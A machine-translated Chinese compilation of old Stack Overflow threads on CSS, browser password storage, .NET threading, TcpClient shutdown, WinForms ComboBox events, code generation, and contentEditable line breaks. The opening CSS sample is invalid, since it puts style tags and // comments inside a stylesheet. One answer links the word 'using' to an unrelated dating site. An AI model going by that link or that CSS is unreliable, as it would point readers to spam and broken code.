我的环境：Chrome浏览器/Safari，

第一次它不起作用，所以根据这里的线程推荐，我最终添加了带有 html 条目的 css 文件

示例 CSS 文件：mystyle.css

```
<style type="”text/css”">
html {
 background-color:#000000;
 background-repeat:repeat-x;
 }

body {
 background-color: #DCDBD9;
color: #2C2C2C;
font: normal 100% Cambria, Georgia, serif;
}
</style> 
```

示例 html 文件：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN">

<html>
<head>
  <meta name="generator" content="HTML Tidy for Mac OS X (vers 31 October 2006 - Apple Inc. build 15.6), see www.w3.org">

  <title>Test Html File</title>
  <link rel="stylesheet" href="mystyle.css" type="text/css">
</head>

<body>
  <h1>Achieve sentence with Skynet! READ MORE</a></h1>
</body>
</html> 
```

第一次加载后，它将在 Chrome 中运行，然后返回 CSS 文件注释 html 条目，因此您修改后的 CSS 将是

```
<style type="”text/css”">
// html {
//    background-color:#000000;
//    background-image:url('bg.png');
//    background-repeat:repeat-x;
// }

body {
    background-color: #DCDBD9;
    color: #2C2C2C;
    font: normal 100% Cambria, Georgia, serif;
    }

  </style> 
```

显然似乎是 webkit 中的错误，在 Safari 中也看到了相同的行为。感谢分享 html 信息，一直在寻找为什么 body 标签不起作用。

最终输出是这样的：

![修复html标签后](https://i.stack.imgur.com/qDqIJ.png)

# browser - 浏览器如何加密网站密码？

> ID：425221
> 
> 赞同：6
> 
> 时间：2009-01-08T17:50:44.023
> 
> 标签：browser, encryption, passwords

Web 浏览器使用哪些特定于平台的 API 在**本地系统**上通过可逆加密安全地保存密码？

由于他们必须能够复制准确的字符以传递到网站，因此数据不能是单向哈希。我最初的想法是有一些系统方法利用您当前的身份验证数据来执行加密/解密，但不授予应用程序直接读取它的权限（您的系统登录数据）。我想知道这些在不同平台（Windows、Linux、OS X）上是什么，以及如果直接访问硬盘驱动器，它们保护信息的能力如何；即，将被盗的笔记本电脑硬盘驱动器放入另一台计算机或通过 Live CD 进行分析。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T17:54:26.807

[以下是谷歌浏览器的做法。](http://blog.paranoidferret.com/index.php/2008/09/10/how-google-chrome-stores-passwords/)看起来他们在 Windows 上使用[CryptProtectData 。](http://msdn.microsoft.com/en-us/library/aa380261.aspx)

# vb.net - 使用多线程时 ProgressBar 冻结

> ID：425226
> 
> 赞同：0
> 
> 时间：2009-01-08T17:53:54.890
> 
> 标签：vb.net, multithreading, unresponsive-progressbar

我有一个 ProgressBar，它在生成报告时使用选取框样式。我这样做的原因是因为我使用的 ReportViewer 控件需要一些时间来生成报告，从而使表单无响应。我使用线程生成报告，因此 ProgressBar 可以显示程序正在运行。但是，当我启动线程时，ProgressBar 会冻结。我已经尝试过 BackgroundWorker，但没有奏效，所以我使用了自己的线程。

我使用 Invoke() 方法的原因是因为我无法在我创建的线程上对 ReportViewer 控件进行更改，因为它是在 UI 线程上创建的。

处理时间最长的方法是 ReportViewer 控件的 RefreshReport() 方法，这就是为什么我尝试在其自己的线程而不是 UI 线程上执行此操作的原因。

任何帮助，将不胜感激。谢谢。

这是我的线程变量的代码：

```
Private t As New Thread(New ParameterizedThreadStart(AddressOf GenerateReport)) 
```

这是生成报告的按钮的代码：

```
Private Sub btnGenerateReport_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnGenerateReport.Click
    pbReports.Style = ProgressBarStyle.Marquee

    If t.ThreadState = ThreadState.Unstarted Then
        t.IsBackground = True
        t.Start(ReportType.Roads)
    ElseIf t.ThreadState = ThreadState.Stopped Then
        t = Nothing
        t = New Thread(New ParameterizedThreadStart(AddressOf GenerateReport))
        t.IsBackground = True
        t.Start(ReportType.Roads)
    End If
End Sub 
```

这是生成报告的代码：

```
Public Sub GenerateReport(ByVal rt As ReportType)
    If rvReport.InvokeRequired Then
        Dim d As New GenerateReportCallBack(AddressOf GenerateReport)
        Me.Invoke(d, New Object() {rt})
    Else
        rvReport.ProcessingMode = ProcessingMode.Remote
        rvReport.ShowParameterPrompts = False
        rvReport.ServerReport.ReportServerUrl = New Uri("My_Report_Server_URL")
        rvReport.ServerReport.ReportPath = "My_Report_Path"
        rvReport.BackColor = Color.White

        rvReport.RefreshReport()
    End If

    If pbReports.InvokeRequired Then
        Dim d As New StopProgressBarCallBack(AddressOf StopProgressBar)
        Me.Invoke(d)
    Else
        StopProgressBar()
    End If
End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T17:58:27.440

您的代码正在从 UI 线程启动一个新线程。然后，新线程立即使用 Invoke 编组回 UI 线程 - 所以基本上就好像您根本没有将其设为多线程一样。

取而代之的是，让新线程完成它所能做的所有后台处理，并且只将需要更新 UI 的部分进程编组回 UI。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T18:08:34.453

您可以尝试使用 ThreadPool 生成新的工作线程。我在 WPF 应用程序中使用以下内容来显示任何需要超过 4 秒左右的加载屏幕。

您可能需要更改一些语法，因为我是 C# 人...

```
Private Sub btnGenerateReport_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnGenerateReport.Click
    pbReports.Style = ProgressBarStyle.Marquee

    ThreadPool.QueueUserWorkItem(Function(th) Do
        GenerateReport(ReportType.Roads)
        Dispatcher.BeginInvoke(DispatcherPriority.Normal, DirectCast(Function() Do
            StopProgressBar()
        End Function, Action)
    End Function)

End Sub 
```

另外，我相信 Dispatcher.BeginInvoke 仅在 WPF 中而不在 WinForms 中，因此您需要将其更改回 Me.Invoke 或其他内容。

# javascript - 如何动态创建一个 在包含 HTML 实体 (- ... «) 的 JavaScript 中？

> ID：425234
> 
> 赞同：10
> 
> 时间：2009-01-08T17:55:14.183
> 
> 标签：javascript, html-entities, html-select

我想在 <option> 元素的文本包含 HTML 实体的 <select> 元素中添加一个 <option> 元素： —

在 HTML 中，代码如下所示：

```
<select name="test" id="test">
    <option value="">&mdash; Select One &mdash;</option>
</select> 
```

我的 JavaScript 代码如下所示：

```
function selectOne() {
  var e = document.getElementById('test');
  e.options[0] = new Option('&mdash; Select One &mdash;', '');
} 
```

但是，如果您对此进行测试，您将看到 — 变得逃脱。当我尝试时，我得到了同样的结果：

```
e.options[o].text = '&mdash; Select One &mdash;'; 
```

（观察到的行为是在 Internet Explorer 7 中……没有用 Firefox、Safari 等进行测试。Internet Explorer 7 是我目前唯一需要的浏览器。）

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-01-08T18:03:14.167

我刚刚意识到我可以使用 Unicode JavaScript 转义：

```
e.options[0] = new Option('\u2014 Select One \u2014', ''); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-08T18:01:15.170

您不需要转义实体 - 它的工作原理如下：

```
function selectOne() {
      var e = document.getElementById('test');
      e.options[0] = new Option('— Select One —', '');
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-17T20:04:53.267

`text`property 不会被转义，因为它是按字面意思理解的。如果您使用`innerHTML`，实体将转换为相应的字符。

```
e.options[o].innerHTML = '&mdash; Select One &mdash;'; 
```

# c# - 如何正确和完全关闭/重置 TcpClient 连接？

> ID：425235
> 
> 赞同：84
> 
> 时间：2009-01-08T17:55:24.137
> 
> 标签：c#, .net, tcp

关闭或重置 TcpClient 连接的正确方法是什么？我们有与硬件通信的软件，但有时会出现问题，我们不再与它通信，直到我们重新启动软件。

我曾尝试强制 TcpClient.Close() 甚至将其设置为 null 但这不起作用。只有完全重新启动软件才能工作。

建议？

* * *

我不能使用 using 关键字，因为 TpcClient 仅在一个位置定义，但在整个库中都使用。（并且在任何给定时间只有一个连接）

这是一个处理通信的库。软件本身可以调用Controller类（代表硬件）的ResetConnection()方法。

目前看起来像

```
if (tcpClient != null)
{
    tcpClient.Close();
    tcpClient = null;
} 
```

现在从我在这里读到的内容，我应该使用 tcpClient.Dispose() 而不是“= null”

我会尝试一下，看看它是否有所作为。

* * *

## 回答 #1

> 赞同：98
> 
> 时间：2009-12-30T14:44:49.223

您必须在关闭连接之前关闭流：

```
tcpClient.GetStream().Close();
tcpClient.Close(); 
```

关闭客户端不会关闭流。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2016-03-22T09:59:02.880

鉴于已接受的答案已过时，并且我在其他答案中看不到任何关于此的答案，因此我正在创建一个新答案。在 .Net 2 及更早版本中，您必须在关闭连接之前手动关闭流。该错误在 C# 的所有更高版本中都已修复，并且如[Close 方法](https://msdn.microsoft.com/en-us/library/system.net.sockets.tcpclient.close(v=vs.110).aspx)`TcpClient`的文档中所述，对该方法的调用会关闭连接和流`Close`

*根据 Microsoft Docs 编辑*

> Close 方法将实例标记为已释放，并请求关联的 Socket 关闭 TCP 连接。根据 LingerState 属性，当数据仍有待发送时，调用 Close 方法后 TCP 连接可能会保持打开状态。当基础连接完成关闭时，不会提供任何通知。

调用此方法最终会导致关联的 Socket 关闭，并且还会关闭关联的用于发送和接收数据的 NetworkStream（如果已创建）。

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2009-01-08T18:42:13.183

用词：[**`using`**](http://www.10bestfreedatingservices.com/blog/2008/09/50-reasons-to-date-a-geek/)。编程的好习惯。

```
using (TcpClient tcpClient = new TcpClient())
{
     //operations
     tcpClient.Close();
} 
```

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2018-01-17T16:34:05.503

尽管有所有适当的`using`语句，调用`Close`，有一些指数回退逻辑并重新创建`TcpClient`我仍然看到应用程序无法在没有应用程序重新启动的情况下恢复 TCP 连接的问题。它一直以 `System.IO.IOException: Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host`.

但是有一个选项看起来它可能已经解决`LingerState`了`TcpClient`这个问题（可能几个月都不知道，因为我自己的硬件设置经常失败！）。请参阅[MSDN](https://msdn.microsoft.com/en-us/library/system.net.sockets.tcpclient.lingerstate(v=vs.110).aspx)。

```
// This discards any pending data and Winsock resets the connection.
LingerOption lingerOption = new LingerOption(true, 0);

using (var tcpClient = new TcpClient 
       {SendTimeout = 2000, ReceiveTimeout = 2000, LingerState = lingerOption })
   ... 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-01-09T14:35:40.367

除了一些内部日志，Close == Dispose。

Dispose 调用 tcpClient.Client.Shutdown( SocketShutdown.Both )，但它会吃掉任何错误。也许如果你直接调用它，你可以得到一些有用的异常信息。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2009-08-13T23:57:19.080

关闭套接字连接并允许重新使用套接字：

```
tcpClient.Client.Disconnect(false); 
```

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2016-06-24T06:25:38.147

关闭套接字以便重新打开的正确方法是：

```
tcpClient.Client.Disconnect(true); 
```

布尔参数指示是否要重用套接字：

[![断开方法使用](https://i.stack.imgur.com/fuROH.png)](https://i.stack.imgur.com/fuROH.png)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-08T18:16:40.583

您是否尝试过显式调用[TcpClient.Dispose()](http://msdn.microsoft.com/en-us/library/vstudio/bb340916(v=vs.100).aspx)？

你确定你有 TcpClient.Close() 和 TcpClient.Dispose()-ed **ALL**连接吗？

# c# - Winform 上的 C# 组合框是否有更新前

> ID：425241
> 
> 赞同：3
> 
> 时间：2009-01-08T17:56:18.380
> 
> 标签：c#, winforms, combobox, beforeupdate

我来自 VBA 世界，记得`BeforeUpdate`我可以在组合框上拨打电话。现在我在 C# 中（并且喜欢它），我想知道在 Winform 上是否有`BeforeUpdate`调用`ComboBox`a ？

我可以制作一个不可见的文本框并将我需要的信息存储在那里，更新后，查看该框以获取我需要的内容，但我希望有一个更简单的解决方案。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-08T18:28:35.757

WF 的优点之一是您可以轻松制作自己的。向您的项目添加一个新类并粘贴下面的代码。编译。将新控件从工具箱顶部拖放到表单上。实施更新前事件。

```
using System;
using System.ComponentModel;
using System.Windows.Forms;

public class MyComboBox : ComboBox {
  public event CancelEventHandler BeforeUpdate;

  public MyComboBox() {
    this.DropDownStyle = ComboBoxStyle.DropDownList;
  }

  private bool mBusy;
  private int mPrevIndex = -1;

  protected virtual void OnBeforeUpdate(CancelEventArgs cea) {
    if (BeforeUpdate != null) BeforeUpdate(this, cea);
  }

  protected override void OnSelectedIndexChanged(EventArgs e) {
    if (mBusy) return;
    mBusy = true;
    try {
      CancelEventArgs cea = new CancelEventArgs();
      OnBeforeUpdate(cea);
      if (cea.Cancel) {
        // Restore previous index
        this.SelectedIndex = mPrevIndex;
        return;
      }
      mPrevIndex = this.SelectedIndex;
      base.OnSelectedIndexChanged(e);
    }
    finally {
      mBusy = false;
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-08T18:26:17.833

你可以考虑`SelectionChangeCommited`。

来自 MSDN：

> 仅当用户更改组合框选择时才会引发 SelectionChangeCommitted。不要使用SelectedIndexChanged或SelectedValuechangeD以捕获用户更改，因为在选择以编程方式更改时也会提出这些事件。

但是，当您将组合框设置为允许用户在文本框中键入时，这将不起作用。此外，它不会告诉您“最后”选择的项目是什么。您将不得不缓存此信息。但是，您不需要将信息存储在文本框中。您可以使用字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T17:59:43.363

您可以尝试 ValueMemberChanged、Validating、SelectedIndexChanged 或 TextChanged。它们不像 BeforeUpdate 那样触发，但是您可以查看将要更新的内容并处理更新的内容，或者拒绝它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T18:28:57.173

开箱即用，没有这样的东西。所有处理组合框中更改的事件都发生在新值被选中之后。那时，无法判断 USED 的值是多少。你最好的选择是你逃避的。填充 ComboBox 后，将 SelectedItem 保存到临时变量。然后，挂钩 SelectedValueChanged 事件。此时，您的临时变量将是您的旧值，而 SelectedItem 将是您的当前值。

```
private object oldItem = new object();

        private void button3_Click(object sender, EventArgs e)
        {
            DateTime date = DateTime.Now;
            for (int i = 1; i <= 10; i++)
            {
                this.comboBox1.Items.Add(date.AddDays(i));
            }

            oldItem = this.comboBox1.SelectedItem;
        }

        private void comboBox1_SelectedValueChanged(object sender, EventArgs e)
        {
            //do what you need with the oldItem variable
            if (oldItem != null)
            {
                MessageBox.Show(oldItem.ToString());
            }

            this.oldItem = this.comboBox1.SelectedItem;
        } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-11-16T00:04:45.353

我认为您想要的是 DropDown 事件。它会在用户更改它之前告诉您该值是什么。但是，用户最终可能不会更改任何内容，因此它与更新前不完全相同。

# code-generation - 微代码生成被认为是有害的吗？

> ID：425242
> 
> 赞同：11
> 
> 时间：2009-01-08T17:56:49.783
> 
> 标签：code-generation

我最近写了一个小工具，为我手写的每一层生成一个类，用于枯燥的“数据表格”工作，我花了将近 90% 的时间（我知道很沮丧）......随着经济的改善，更多关于这个； )

我的问题是——使用这个工具而不是每天手工输入所有这些代码真的会伤害我作为开发人员吗？我觉得我将始终对这个工具进行更改，因此我“应该”保持在使用的模式/做出的选择/等之上......但我的一小部分感觉我可能会失去我的优势......我我错了吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-01-08T18:00:28.183

如果该工具可以不假思索地吐出代码，那么它可能会为您节省大量不经意的打字。

首先编写工具需要思考，所以我猜你会更“处于边缘”维护和编写工具。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-01-08T18:04:18.987

那挺好的！当然，编写一个工具来为你完成所有工作是不可能的，也是错误的。

但是**自动化可重复的任务总是好的**——有时编写特定类型的代码是可重复的。

**《实用程序员》**一书中甚至鼓励它。

确保在源代码管理中检查了代码生成器而**不是**其输出（除非您以后必须手动修改代码）！

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-01-08T17:59:22.227

你绝对没有错。我可以在任何地方使用代码生成器——我目前使用 CodeSmith 通过查看数据库来创建我的 DAO。

你害怕失去什么优势？在我看来，代码生成实际上*给了*你一个优势。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-08T18:11:48.830

Larry Wall（以 Perl 闻名）将编程的三个主要优点描述为懒惰、不耐烦和狂妄自大。

恭喜！你已经表现出很好的懒惰，因为你已经确定了一些可以传递给自动化流程的工作并完成了。（糟糕的懒惰会导致偷工减料、拖延，并且通常会推迟而不是消除工作。）如果你能成功地将一些工作转移到另一个程序上，你就可以减少花在烦人的琐事上的时间，而将更多的时间花在完成事情和学习上。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-08T18:01:50.613

生成你能做的。代码生成是我在过去 2 或 3 年中使用的最好的工具之一。一遍又一遍地输入相同的代码（或复制并粘贴）很容易出错。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-08T18:03:10.143

通过让某事/别人做某事来花更少的时间做某事，而更多的时间研究更好的方法来做这件事通常会导致以更好的方式去做。

这不仅仅适用于编程......

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-01-08T19:06:15.803

您的代码生成器（至少在原则上——我自己没有看过）是正确的，至少就目前而言。

下一步是看看您是否可以创建一个功能与生成的代码匹配的基类，而不是生成所有这些冗余代码，然后从中派生您的应用程序代码。使用继承而不是生成将使您从改进中受益，而无需在所有项目上重新运行生成器。也许更重要的是，如果您自定义生成的代码，如果您重新运行生成器，自定义将会丢失，但是当基类更改时，派生类中的自定义将被保留。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-08T18:01:57.073

不。为什么你认为 IDE 如此受欢迎。想象一下，如果所有使用 Visual Studio 的人都必须在没有 IDE 帮助的情况下以编程方式创建 GUI，那将是可怕的。我敢打赌，大多数使用 VisualStudio 的人都不知道如何手动创建他们在 IDE 中创建的表单。但这并没有错。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-08T18:02:45.887

我相信代码生成会尽可能地消除编程的死记硬背的任务。你不会失去优势，你可能会成为一个更好的程序员，因为你会花更多的时间在重要和有趣的事情上。

顺便说一句，你的工具听起来很有趣。你有没有在任何地方发布它？

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-01-08T18:06:29.717

只要您了解您正在生成的内容，代码生成就可以了。物理学家使用计算器是因为他们了解他们正在自动化的公式，并意识到他们宝贵的时间最好花在重要的任务上。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-01-08T18:14:06.253

代码生成是The Pragmatic Programmer 提倡的宝贵**DO:s之一。**我真心推荐那本书。这是一个[实用的程序员快速参考](http://www.codinghorror.com/blog/files/Pragmatic%20Quick%20Reference.htm)。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2009-01-08T18:14:49.620

**不**生成代码几乎是虚伪的。在这里，我们将所有这些传统上由手工完成的任务自动化......然而，我们中的许多人仍然手摇我们所有的代码，即使它可以很容易地生成。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2009-01-08T18:22:07.423

我唯一的代码生成经验是 Common Lisp 的宏。它们一直在使用。使重复性任务自动化的一切都是有益的；这就是编程的意义所在。

阅读[Mac 的故事](http://gigamonkeys.com/book/macros-defining-your-own.html)。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2009-01-08T18:26:18.240

想象一下，每次您对工具进行更改并重新生成代码时，您都会在所有模块上手动更改设计。

自从我开始生成代码并加快速度以来，我发现我很少在生成的代码中遇到错误。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2009-01-08T18:48:57.757

我发现编写代码生成确实有助于我了解良好架构的细微差别。您开始看到常见的模式，而不是狭隘的设计视图。也就是说，不要使用代码生成来替代好的面向对象的代码，也不要太喜欢你的代码生成，你会忽略新技术。例如，如果您在 .NET 中并且正在编写代码生成以进行数据访问，那么您最好有一个不使用 Linq to SQL 或 NHibernate 的好借口。同样，动态数据可以在许多表单数据场景中提供帮助。所以，我的建议是：根据需要增加新的东西和代码生成。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2009-01-08T20:20:02.940

我对代码生成的 2cents 是它对于重构的使用也很重要。我发现部分类和良好的文件比较实用程序（Araxis 或 BeyondCompare）是必不可少的。

将您生成的代码保存在一个文件中，并将您为该类所做的自定义调整保存在另一个文件中。

这种做法将使您能够快速实施这些全面的框架更改，还将帮助您迁移到新的范例，同时轻松地保存您的自定义逻辑。

CodeSmith FTW！

虽然构建服务器可以很好地确保所有代码都能编译，但它并不能解决签名与存储过程等的差异。如果您定期运行代码生成器，您可以更轻松地识别这些更改何时发生。单元测试会告诉你 SP 是错误的，代码生成会告诉你如何使它正确。

# wpf - 针对 .NET 框架 3.0 的错误

> ID：425253
> 
> 赞同：1
> 
> 时间：2009-01-08T18:00:46.140
> 
> 标签：wpf, visual-studio-2008

我有一个应用程序，我在 VS 2008 中开发，我的目标是 .NET 3。

不幸的是，当我使用 .NET 3 在干净的计算机上安装时，它崩溃了。除了通常的 TypeInitilisationError，我不知道为什么。

将同一台机器更新到 .NET 3.5SP1 使其运行良好。

1.  VS2008 中是否有问题阻止告诉我更详细的错误？
2.  我如何确定我不使用任何最新的框架类？确实，我发现自己使用的是属于 3SP1 的 DropShadowEffect。我删除了它。

但是……还是不行。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T18:30:37.700

您是否尝试过确定每台计算机上安装了哪个版本的框架。如果您使用 .Net 3.5 SP1 来编译程序，它实际上包括 .Net 3.0 sp2，它具有一些额外的功能（例如 MultiSelector 类），这些在 .Net 3.0 sp1 中不可用，这是 .Net 3.0 的默认安装从微软下载。

您可以在这里尝试一些有用的软件： [NetVersionCheck](http://www.raymond.cc/blog/archives/2008/11/06/how-to-check-what-version-of-microsoft-net-framework-is-installed-in-computer/)

**编辑：** Visual Studio 不会告诉您任何错误，因为它使用的 .Net 3.0 版本似乎一切正常。我使用 WPF 工具包遇到了这个问题，因为它需要 MultiSelector 类，该类直到 .Net 3.0 sp2 才出现。因此，乔纳森，如果您可以向我们展示您的程序在“新鲜”.Net 3.0 计算机上的错误输出，那么我们可能会告诉您您在 .Net 3.0 sp2 中使用的内容在较低版本中不受支持.

此外，我通常将 VS2005 与我希望在比 .Net 3.5sp1 更低的运行时间下运行的程序一起使用，但这实际上只适用于 .Net 2.0 应用程序。

如果我们知道您正在使用 .Net 3.0 中的哪些组件，那也会有所帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T18:39:53.703

诺亚

感谢你的回答。由于 VS2008，在我的开发计算机上我有最新的 3.5SP1。但在 Visual Studio 中，我选择了 3 作为目标。

并检查我安装在一台干净的电脑上 3.0...

所以你的提议确实告诉我安装了哪个框架，但没有告诉我我的程序在 3.0 中不存在的最新框架中使用了什么。

此外，必须在 VS2008 中打破某些东西，因为它应该让我感到温暖......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T22:31:58.703

我觉得这是 VS 2008 的问题，但显然 MS 感觉不同。

VS 2008 带有 .NET 3.5、一些 .NET 3.0 服务包和 .NET 2.0 SP1。它只能检测您是否使用了不属于*您机器上安装*的版本的东西，而不是您是否符合某些服务包。这意味着如果您以 .NET 2.0 为目标，但将软件安装在没有 .NET 2.0 SP1 的机器上，如果您使用任何特定于 SP1 的东西，您的应用程序在尝试进行调用时将失败。

我所看到的检测到这一点的唯一方法是检查服务包的更改列表或以 .NET 3.5 为目标。如果安装了 .NET 3.5，那么随附的服务包也会随之安装。这不是一个好的解决方案，但它是我找到的唯一一个。

# javascript - 防止 contentEditable 中的换行符/段落符

> ID：425274
> 
> 赞同：58
> 
> 时间：2009-01-08T18:07:36.453
> 
> 标签：javascript, firefox, contenteditable

在 Firefox 中使用 contentEditable 时，有没有办法防止用户通过按 enter 或 shift+enter 来插入段落或换行符？

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2009-01-09T14:03:48.293

您可以将事件处理程序附加到 contentEditable 字段的 keydown 或 keypress 事件，如果 keycode 将自身标识为 enter（或 shift+enter），则取消该事件。

当焦点位于 contentEditable 字段中时，这将完全禁用 enter/shift+enter。

如果使用 jQuery，类似：

```
$("#idContentEditable").keypress(function(e){ return e.which != 13; }); 
```

...这将返回 false 并取消输入时的按键事件。

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2015-10-20T14:50:55.730

使用 Vanilla JS 可以做到这一点，只需付出同样的努力：

```
document.getElementById('idContentEditable').addEventListener('keypress', (evt) => {
    if (evt.which === 13) {
        evt.preventDefault();
    }
}); 
```

您不应该将 jQuery 用于最简单的事情。此外，您可能想使用“key”而不是“which”：[https ://developer.mozilla.org/en-US/docs/Web/Events/keypress](https://developer.mozilla.org/en-US/docs/Web/Events/keypress)

**更新，因为`keypress`已弃用：**

```
document.getElementById('idContentEditable').addEventListener('keydown', (evt) => {
    if (evt.keyCode === 13) {
        evt.preventDefault();
    }
}); 
```

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2013-08-25T07:32:59.803

添加以下 CSS 规则以*隐藏*换行符。这只是一个样式设置，您应该添加一些事件处理程序以*防止*插入换行符：

```
.your_editable br {
    display: none
} 
```

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2017-05-24T14:56:57.187

除了添加换行符之外，浏览器还添加了其他标签和样式（当您粘贴文本时，浏览器还会附加您粘贴的文本样式）。

下面的代码涵盖了所有内容。

*   当你按下回车时，不会添加换行符。
*   粘贴文本时，浏览器添加的所有元素都会从文本中删除。

    ```
    $('[contenteditable]').on('paste', function(e) {
        //strips elements added to the editable tag when pasting
        var $self = $(this);
        setTimeout(function() {$self.html($self.text());}, 0);
    }).on('keypress', function(e) {
         //ignores enter key
         return e.which != 13;
    }); 
    ```

[单击此处查看实时示例](https://jsfiddle.net/b8bb8rwv/3/)

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2013-01-10T19:50:33.857

另一种选择是允许输入中断但在模糊时将其删除。这具有处理粘贴内容的优势。您的用户会喜欢它或讨厌它（取决于您的用户）。

```
function handle_blur(evt){
  var elt=evt.target; elt.innerText=elt.innerText.replace(/\n/g,' ');
} 
```

然后，在 html 中：

```
<span onblur="handle_blur(event)" contenteditable>editable text</span> 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2012-12-20T15:48:04.700

如果您使用的是 JQuery 框架，则可以使用*on*方法对其进行设置，这将使您对所有元素都具有所需的行为，即使最近添加了该元素。

```
$(document).on('keypress', '.YourClass', function(e){
    return e.which != 13; 
}); 
```

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2020-03-01T06:14:13.933

添加：

```
display: flex; 
```

在 contenteditable html 元素上

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2009-02-26T13:51:34.250

```
$("#idContentEditable").keypress(function(e){ return e.which != 13; }); 
```

Kamens 提出的解决方案在 Opera 中不起作用，您应该将事件附加到文档中。

```
/**
 * Pass false to enable
 */
var disableEnterKey = function(){
    var disabled = false;

    // Keypress event doesn't get fired when assigned to element in Opera
    $(document).keypress(function(e){
        if (disabled) return e.which != 13;
    });                 

    return function(flag){
        disabled = (flag !== undefined) ? flag : true;
    }
}(); 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2015-07-28T20:13:49.850

如果要定位所有 contentEditable 字段，请使用

```
$('[contenteditable]').keypress(function(e){ return e.which != 13; }); 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2018-11-29T13:17:01.453

我来到这里寻找相同的答案，并惊讶地发现这是一个相当简单的解决方案，使用久经考验的真实[`Event.preventDefault()`](https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault)

```
const input = document.getElementById('input');

input.addEventListener('keypress', (e) => {
  if (e.which === 13) e.preventDefault();
});
```

```
<div contenteditable="true" id="input">
  You can edit me, just click on me and start typing.
  However, you can't add any line breaks by pressing enter.
</div>
```

* * *

## 回答 #11

> 赞同：-3
> 
> 时间：2018-08-02T14:32:48.390

使用 CSS：

```
word-break: break-all; 
```

对我来说，它的工作！

# java - Java 风格：正确处理异常

> ID：425281
> 
> 赞同：17
> 
> 时间：2009-01-08T18:10:37.507
> 
> 标签：java, exception

在为我的项目决定异常处理结构时，我一直在概念上陷入困境。

假设您有，例如：

```
public abstract class Data {
   public abstract String read();
} 
```

还有两个子类 FileData，它从某个指定的文件中读取您的数据，以及 StaticData，它只返回一些预定义的常量数据。

现在，在读取文件时，可能会在 FileData 中抛出 IOException，但 StaticData 永远不会抛出。大多数风格指南建议将异常向上传播到调用堆栈，直到有足够多的上下文可用以有效处理它。

但我真的不想在抽象的 read() 方法中添加 throws 子句。为什么？因为数据和使用它的复杂机器对文件一无所知，它只知道数据。此外，可能还有其他 Data 子类（以及更多）从不抛出异常并完美地传递数据。

另一方面，IOException 是必要的，因为如果磁盘不可读（或类似情况），则*必须*抛出错误。因此，我看到的唯一出路是捕获 IOException 并在其位置抛出一些 RuntimeException。

这是正确的哲学吗？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-01-08T18:39:53.953

你是对的。

异常应该与使用的抽象级别相同。这就是从 java 1.4 Throwable 开始支持异常链接的原因。例如，对于使用数据库的服务或与“存储”不可知的服务，抛出 FileNotFoundException 是没有意义的。

它可能是这样的：

```
public abstract class Data {
   public abstract String read() throws DataUnavailableException;
}

class DataFile extends Data { 
    public String read() throws DataUnavailableException {
        if( !this.file.exits() ) {
            throw new DataUnavailableException( "Cannot read from ", file );
         }

         try { 
              ....
         } catch( IOException ioe ) { 
             throw new DataUnavailableException( ioe );
         } finally {
              ...
         }
 }

class DataMemory extends Data { 
    public String read()  {
        // Everything is performed in memory. No exception expected.
    }
 }

 class DataWebService extends Data { 
      public string read() throws DataUnavailableException {
           // connect to some internet service
           try {
              ...
           } catch( UnknownHostException uhe ) {
              throw new DataUnavailableException( uhe );
           }
      }
 } 
```

请记住，如果您在编程时考虑到继承，则应针对特定场景仔细设计并使用这些场景测试实现。显然，如果编写通用库更难，因为您不知道如何使用它。但大多数时候，应用程序都被限制在一个特定的领域。

